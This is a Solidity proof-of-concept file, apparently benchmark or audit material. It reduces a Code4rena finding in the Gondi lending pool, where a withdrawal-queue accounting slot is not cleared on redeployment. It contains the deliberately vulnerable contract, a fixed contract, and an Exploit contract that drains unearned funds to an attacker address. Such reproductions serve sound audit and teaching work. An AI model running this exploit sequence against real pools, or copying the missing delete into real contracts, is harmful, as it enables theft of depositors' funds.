// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Gondi Pool — deployWithdrawalQueue leaves _queueAccounting[lastQueueIndex]
    (bin2chen, Code4rena 2024-04 H-07, finding 35209).
    SYNTHETIC, cheatcode-free reduction. Deploy and the accounting read are the
    audited bodies. Loan-id routing is omitted: noteRepayment credits
    getTotalReceived the way _loanTermination does. */

library MulDiv {
    function mulDivDown(uint256 x, uint256 y, uint256 denominator) internal pure returns (uint256) {
        return x * y / denominator;
    }
}

library MulDiv128 {
    function mulDivDown(uint128 x, uint256 y, uint256 denominator) internal pure returns (uint256) {
        return uint256(x) * y / denominator;
    }
}

library SafeTransferLib {
    function safeTransfer(PoolAsset token, address to, uint256 amount) internal {
        require(token.transfer(to, amount), "TRANSFER");
    }
}

contract PoolAsset {
    string public name = "USD Coin";
    string public symbol = "USDC";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @dev NFT withdrawal receipt. Per-share payout matches Gondi's _getAvailable.
contract WithdrawalQueue {
    PoolAsset private immutable _asset;
    address public immutable getPool;
    uint256 public getTotalShares;
    uint256 public getNextTokenId;
    uint256 private totalWithdrawn;

    mapping(uint256 tokenId => uint256 shares) public getShares;
    mapping(uint256 tokenId => address owner) public ownerOf;
    mapping(uint256 tokenId => uint256 withdrawn) public getWithdrawn;

    constructor(PoolAsset asset_) {
        _asset = asset_;
        getPool = msg.sender;
    }

    function mint(address to, uint256 shares) external returns (uint256 tokenId) {
        require(msg.sender == getPool, "POOL");
        tokenId = getNextTokenId;
        ownerOf[tokenId] = to;
        getShares[tokenId] = shares;
        getTotalShares += shares;
        getNextTokenId = tokenId + 1;
    }

    function withdraw(address to, uint256 tokenId) external returns (uint256 available) {
        require(msg.sender == ownerOf[tokenId], "OWNER");
        available = getShares[tokenId] * (totalWithdrawn + _asset.balanceOf(address(this))) / getTotalShares
            - getWithdrawn[tokenId];
        getWithdrawn[tokenId] += available;
        totalWithdrawn += available;
        require(_asset.transfer(to, available), "TRANSFER");
    }
}

interface IGondiPool {
    function deposit(uint256 assets) external returns (uint256 shares);
    function requestWithdraw(uint256 shares) external returns (uint256 tokenId);
    function deployWithdrawalQueue() external;
    function noteRepayment(uint256 idx, uint256 received) external;
    function queueClaimAll() external;
    function thisQueueFraction(uint256 idx) external view returns (uint128);
    function queueAddress(uint256 idx) external view returns (address);
}

contract PoolCore {
    using MulDiv for uint256;
    using MulDiv128 for uint128;
    using SafeTransferLib for PoolAsset;

    uint80 public constant PRINCIPAL_PRECISION = 1e20;

    struct OutstandingValues {
        uint128 principalAmount;
        uint128 accruedInterest;
        uint128 sumApr;
        uint128 lastTs;
    }

    struct QueueAccounting {
        uint128 thisQueueFraction;
        uint128 netPoolFraction;
    }

    struct DeployedQueue {
        address contractAddress;
        uint96 deployedTime;
    }

    PoolAsset public asset;
    uint256 public immutable getMaxTotalWithdrawalQueues;
    uint256 public immutable getMinTimeBetweenWithdrawalQueues;
    uint256 public totalSupply;
    uint256 public getAvailableToWithdraw;
    mapping(address => uint256) public balanceOf;
    mapping(uint256 queueIndex => uint256 totalReceived) public getTotalReceived;

    DeployedQueue[] internal _deployedQueues;
    OutstandingValues internal _outstandingValues;
    uint256 internal _pendingQueueIndex;
    OutstandingValues[] internal _queueOutstandingValues;
    QueueAccounting[] internal _queueAccounting;

    uint256 private _status = 1;

    error TooSoonError();
    error NoSharesPendingWithdrawalError();

    modifier nonReentrant() {
        require(_status == 1, "REENTRANCY");
        _status = 2;
        _;
        _status = 1;
    }

    constructor(PoolAsset asset_) {
        asset = asset_;
        getMaxTotalWithdrawalQueues = 2;
        getMinTimeBetweenWithdrawalQueues = 0;
        uint256 slots = getMaxTotalWithdrawalQueues + 1;
        _deployedQueues = new DeployedQueue[](slots);
        _deployedQueues[_pendingQueueIndex] = _deployQueue(asset_);
        _queueOutstandingValues = new OutstandingValues[](slots);
        _queueAccounting = new QueueAccounting[](slots);
    }

    function deposit(uint256 assets) external returns (uint256 shares) {
        uint256 supply = totalSupply;
        if (supply == 0) {
            shares = assets;
        } else {
            shares = assets.mulDivDown(supply, _getUndeployedAssets());
        }
        require(asset.transferFrom(msg.sender, address(this), assets), "PULL");
        balanceOf[msg.sender] += shares;
        totalSupply = supply + shares;
    }

    /// @dev Matches Pool._burn: share balance drops now, totalSupply drops at deploy.
    function requestWithdraw(uint256 shares) external returns (uint256 tokenId) {
        balanceOf[msg.sender] -= shares;
        address queue = _deployedQueues[_pendingQueueIndex].contractAddress;
        tokenId = WithdrawalQueue(queue).mint(msg.sender, shares);
    }

    /// @dev Credits getTotalReceived the way _loanTermination does after the loan-id walk.
    function noteRepayment(uint256 idx, uint256 received) external {
        require(asset.transferFrom(msg.sender, address(this), received), "REPAY");
        getTotalReceived[idx] += received;
    }

    function queueClaimAll() external nonReentrant {
        /// @dev Transfer capital to queues.
        _queueClaimAll(getAvailableToWithdraw, _pendingQueueIndex);
    }

    function thisQueueFraction(uint256 idx) external view returns (uint128) {
        return _queueAccounting[idx].thisQueueFraction;
    }

    function queueAddress(uint256 idx) external view returns (address) {
        return _deployedQueues[idx].contractAddress;
    }

    function _getUndeployedAssets() internal view returns (uint256) {
        return asset.balanceOf(address(this)) - getAvailableToWithdraw;
    }

    function _reallocateOnWithdrawal(uint256 _withdrawn) internal view {
        uint256 currentBalance = asset.balanceOf(address(this));
        if (currentBalance > _withdrawn) {
            return;
        }
    }

    function _deployQueue(PoolAsset _asset) internal returns (DeployedQueue memory) {
        address deployed = address(new WithdrawalQueue(_asset));
        return DeployedQueue(deployed, uint96(block.timestamp));
    }

    function _updateLoanLastIds() internal {}

    function _updatePendingWithdrawalWithQueue(
        uint256 _idx,
        uint256 _cachedPendingQueueIndex,
        uint256[] memory _pendingWithdrawal
    ) internal returns (uint256[] memory) {
        uint256 totalReceived = getTotalReceived[_idx];
        uint256 totalQueues = getMaxTotalWithdrawalQueues + 1;
        /// @dev Nothing to be returned
        if (totalReceived == 0) {
            return _pendingWithdrawal;
        }
        getTotalReceived[_idx] = 0;

        /// @dev We go from idx to newer queues. Each getTotalReceived is the total
        /// returned from loans for that queue. All future queues/pool also have a piece of it.
        /// X_i: Total received for queue `i`
        /// X_1  = Received * shares_1 / totalShares_1
        /// X_2 = (Received - (X_1)) * shares_2 / totalShares_2 ...
        /// Remainder goes to the pool.
        for (uint256 i; i < totalQueues;) {
            uint256 secondIdx = (_idx + i) % totalQueues;
            // @> VULN: stale _queueAccounting[lastQueueIndex] is still loaded after deploy skips the delete
            QueueAccounting memory queueAccounting = _queueAccounting[secondIdx];
            if (queueAccounting.thisQueueFraction == 0) {
                unchecked {
                    ++i;
                }
                continue;
            }
            /// @dev We looped around.
            if (secondIdx == _cachedPendingQueueIndex + 1) {
                break;
            }
            uint256 pendingForQueue = totalReceived.mulDivDown(queueAccounting.thisQueueFraction, PRINCIPAL_PRECISION);
            totalReceived -= pendingForQueue;

            _pendingWithdrawal[secondIdx] = pendingForQueue;
            unchecked {
                ++i;
            }
        }
        return _pendingWithdrawal;
    }

    function _queueClaimAll(uint256 _totalToBeWithdrawn, uint256 _cachedPendingQueueIndex) internal {
        _reallocateOnWithdrawal(_totalToBeWithdrawn);
        uint256 totalQueues = (getMaxTotalWithdrawalQueues + 1);
        uint256 oldestQueueIdx = (_cachedPendingQueueIndex + 1) % totalQueues;
        uint256[] memory pendingWithdrawal = new uint256[](totalQueues);
        for (uint256 i; i < pendingWithdrawal.length;) {
            uint256 idx = (oldestQueueIdx + i) % totalQueues;
            _updatePendingWithdrawalWithQueue(idx, _cachedPendingQueueIndex, pendingWithdrawal);
            unchecked {
                ++i;
            }
        }
        getAvailableToWithdraw = 0;

        for (uint256 i; i < pendingWithdrawal.length;) {
            if (pendingWithdrawal[i] == 0) {
                unchecked {
                    ++i;
                }
                continue;
            }
            address queueAddr = _deployedQueues[i].contractAddress;
            uint256 amount = pendingWithdrawal[i];

            asset.safeTransfer(queueAddr, amount);
            unchecked {
                ++i;
            }
        }
    }
}

/// @dev Audited pool. deployWithdrawalQueue does not delete _queueAccounting[lastQueueIndex].
contract GondiPool is PoolCore {
    using MulDiv for uint256;
    using MulDiv128 for uint128;
    using SafeTransferLib for PoolAsset;

    constructor(PoolAsset asset_) PoolCore(asset_) {}

    function deployWithdrawalQueue() external nonReentrant {
        /// @dev cache storage var and update
        uint256 pendingQueueIndex = _pendingQueueIndex;
        DeployedQueue memory queue = _deployedQueues[pendingQueueIndex];

        /// @dev Check if we can deploy a new queue.
        if (block.timestamp - queue.deployedTime < getMinTimeBetweenWithdrawalQueues) {
            revert TooSoonError();
        }

        uint256 sharesPendingWithdrawal = WithdrawalQueue(queue.contractAddress).getTotalShares();
        if (sharesPendingWithdrawal == 0) {
            revert NoSharesPendingWithdrawalError();
        }

        uint256 totalQueues = _deployedQueues.length;
        /// @dev It's a circular array so last one is the one after pending.
        uint256 lastQueueIndex = (pendingQueueIndex + 1) % totalQueues;

        /// @dev bring var to mem
        uint256 totalSupplyCached = totalSupply;
        /// @dev Liquid = balance of base asset + base rate asset (eg: WETH / STETH, USDC / aUSDC).
        uint256 proRataLiquid = _getUndeployedAssets().mulDivDown(sharesPendingWithdrawal, totalSupplyCached);
        uint128 poolFraction =
            uint128((totalSupplyCached - sharesPendingWithdrawal).mulDivDown(PRINCIPAL_PRECISION, totalSupplyCached));
        _queueAccounting[pendingQueueIndex] = QueueAccounting(
            uint128(sharesPendingWithdrawal.mulDivDown(PRINCIPAL_PRECISION, totalSupplyCached)), poolFraction
        );

        /// @dev transfer all claims
        _queueClaimAll(proRataLiquid + getAvailableToWithdraw, pendingQueueIndex);
        /// @dev transfer the proRataLiquid to the queue that was pending and is now active.
        asset.safeTransfer(queue.contractAddress, proRataLiquid);

        /// @dev Deploy the next pending queue.
        _deployedQueues[lastQueueIndex] = _deployQueue(asset);

        /// @dev we add totalQueues to avoid an underflow
        uint256 baseIdx = pendingQueueIndex + totalQueues;
        /// @dev Going from newest to oldest, from right to left (on a circular array).
        /// Newest is the one we just deployed at pendingQueueIndex. The queue that has just been
        /// activate represents a fraction of the current pool. The value for each queue that should
        /// go back to the pool is updated accordingly.
        for (uint256 i = 1; i < totalQueues - 1;) {
            uint256 idx = (baseIdx - i) % totalQueues;
            if (_deployedQueues[idx].contractAddress == address(0)) {
                break;
            }
            QueueAccounting memory thisQueueAccounting = _queueAccounting[idx];
            uint128 newQueueFraction =
                uint128(thisQueueAccounting.netPoolFraction.mulDivDown(sharesPendingWithdrawal, totalSupplyCached));
            _queueAccounting[idx].netPoolFraction -= newQueueFraction;

            unchecked {
                ++i;
            }
        }

        /// @dev We move outstaning values from the pool to the queue that was just deployed.
        _queueOutstandingValues[pendingQueueIndex] = _outstandingValues;
        /// @dev We clear values of the new pending queue.
        delete _queueOutstandingValues[lastQueueIndex];
        delete _outstandingValues;
        // FIX: delete _queueAccounting[lastQueueIndex];

        _updateLoanLastIds();

        _pendingQueueIndex = lastQueueIndex;

        // Cannot underflow because the sum of all withdrawals is never larger than totalSupply.
        unchecked {
            totalSupply -= sharesPendingWithdrawal;
        }
    }
}

/// @dev Mitigation: clear the recycled accounting slot inside deployWithdrawalQueue.
contract GondiPoolFixed is PoolCore {
    using MulDiv for uint256;
    using MulDiv128 for uint128;
    using SafeTransferLib for PoolAsset;

    constructor(PoolAsset asset_) PoolCore(asset_) {}

    function deployWithdrawalQueue() external nonReentrant {
        /// @dev cache storage var and update
        uint256 pendingQueueIndex = _pendingQueueIndex;
        DeployedQueue memory queue = _deployedQueues[pendingQueueIndex];

        /// @dev Check if we can deploy a new queue.
        if (block.timestamp - queue.deployedTime < getMinTimeBetweenWithdrawalQueues) {
            revert TooSoonError();
        }

        uint256 sharesPendingWithdrawal = WithdrawalQueue(queue.contractAddress).getTotalShares();
        if (sharesPendingWithdrawal == 0) {
            revert NoSharesPendingWithdrawalError();
        }

        uint256 totalQueues = _deployedQueues.length;
        /// @dev It's a circular array so last one is the one after pending.
        uint256 lastQueueIndex = (pendingQueueIndex + 1) % totalQueues;

        /// @dev bring var to mem
        uint256 totalSupplyCached = totalSupply;
        /// @dev Liquid = balance of base asset + base rate asset (eg: WETH / STETH, USDC / aUSDC).
        uint256 proRataLiquid = _getUndeployedAssets().mulDivDown(sharesPendingWithdrawal, totalSupplyCached);
        uint128 poolFraction =
            uint128((totalSupplyCached - sharesPendingWithdrawal).mulDivDown(PRINCIPAL_PRECISION, totalSupplyCached));
        _queueAccounting[pendingQueueIndex] = QueueAccounting(
            uint128(sharesPendingWithdrawal.mulDivDown(PRINCIPAL_PRECISION, totalSupplyCached)), poolFraction
        );

        /// @dev transfer all claims
        _queueClaimAll(proRataLiquid + getAvailableToWithdraw, pendingQueueIndex);
        /// @dev transfer the proRataLiquid to the queue that was pending and is now active.
        asset.safeTransfer(queue.contractAddress, proRataLiquid);

        /// @dev Deploy the next pending queue.
        _deployedQueues[lastQueueIndex] = _deployQueue(asset);

        /// @dev we add totalQueues to avoid an underflow
        uint256 baseIdx = pendingQueueIndex + totalQueues;
        /// @dev Going from newest to oldest, from right to left (on a circular array).
        /// Newest is the one we just deployed at pendingQueueIndex. The queue that has just been
        /// activate represents a fraction of the current pool. The value for each queue that should
        /// go back to the pool is updated accordingly.
        for (uint256 i = 1; i < totalQueues - 1;) {
            uint256 idx = (baseIdx - i) % totalQueues;
            if (_deployedQueues[idx].contractAddress == address(0)) {
                break;
            }
            QueueAccounting memory thisQueueAccounting = _queueAccounting[idx];
            uint128 newQueueFraction =
                uint128(thisQueueAccounting.netPoolFraction.mulDivDown(sharesPendingWithdrawal, totalSupplyCached));
            _queueAccounting[idx].netPoolFraction -= newQueueFraction;

            unchecked {
                ++i;
            }
        }

        /// @dev We move outstaning values from the pool to the queue that was just deployed.
        _queueOutstandingValues[pendingQueueIndex] = _outstandingValues;
        /// @dev We clear values of the new pending queue.
        delete _queueOutstandingValues[lastQueueIndex];
        delete _queueAccounting[lastQueueIndex];
        delete _outstandingValues;

        _updateLoanLastIds();

        _pendingQueueIndex = lastQueueIndex;

        // Cannot underflow because the sum of all withdrawals is never larger than totalSupply.
        unchecked {
            totalSupply -= sharesPendingWithdrawal;
        }
    }
}

contract Exploit {
    address public constant ATTACKER = 0x1111111111111111111111111111111111111111;
    uint256 public constant UNEARNED = 32e18;
    uint256 public constant LEGIT = 20e18;
    uint128 public constant STALE = 4e19;

    PoolAsset public asset;
    GondiPool public pool;
    uint256 public unearned;
    uint256 public legitSlice;
    uint256 public attackerGot;
    uint128 public recycledFraction;

    constructor() {
        asset = new PoolAsset();
        pool = new GondiPool(asset);
    }

    function run() external {
        runOn(IGondiPool(address(pool)), asset);
        require(attackerGot == UNEARNED, "unearned");
        require(legitSlice == LEGIT, "legit");
        require(recycledFraction == STALE, "stale");
    }

    /// @dev Same calls on the vulnerable pool and on the control that deletes the slot.
    function runOn(IGondiPool pool_, PoolAsset asset_) public {
        asset_.mint(address(this), 100e18);
        asset_.approve(address(pool_), type(uint256).max);
        pool_.deposit(100e18);
        pool_.requestWithdraw(40e18);
        pool_.deployWithdrawalQueue();

        asset_.mint(address(this), 40e18);
        pool_.deposit(40e18);
        pool_.requestWithdraw(25e18);
        pool_.deployWithdrawalQueue();

        asset_.mint(address(this), 25e18);
        pool_.deposit(25e18);
        pool_.requestWithdraw(20e18);
        pool_.deployWithdrawalQueue();

        asset_.mint(address(this), 8e18);
        pool_.deposit(8e18);
        uint256 atkId = pool_.requestWithdraw(8e18);

        asset_.mint(address(this), 100e18);
        pool_.noteRepayment(2, 100e18);

        address recycled = pool_.queueAddress(0);
        address active = pool_.queueAddress(2);
        uint256 recycledBefore = asset_.balanceOf(recycled);
        uint256 activeBefore = asset_.balanceOf(active);
        pool_.queueClaimAll();
        unearned = asset_.balanceOf(recycled) - recycledBefore;
        legitSlice = asset_.balanceOf(active) - activeBefore;
        attackerGot = WithdrawalQueue(recycled).withdraw(ATTACKER, atkId);
        recycledFraction = pool_.thisQueueFraction(0);
    }
}
